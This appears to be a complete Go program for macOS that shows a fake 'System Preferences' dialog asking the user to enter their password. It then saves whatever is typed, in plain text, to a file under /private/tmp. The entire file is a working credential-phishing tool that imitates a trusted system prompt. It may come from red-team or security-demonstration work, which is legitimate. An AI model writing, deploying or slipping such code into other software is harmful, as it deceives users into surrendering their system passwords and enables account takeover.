package main

import (
	"io/ioutil"

	"github.com/gen2brain/dlgs"
)

var (
	title        = "System Preferences"
	prompt       = "Enter your password to continue."
	saveLocation = "/private/tmp/rutroh.txt"
)

func main() {
	passwd, _, err := dlgs.Password(title, prompt)
	if err != nil {
		panic(err)
	}
	err = ioutil.WriteFile(saveLocation, []byte(passwd), 0700)
	if err != nil {
		panic(err)
	}

}
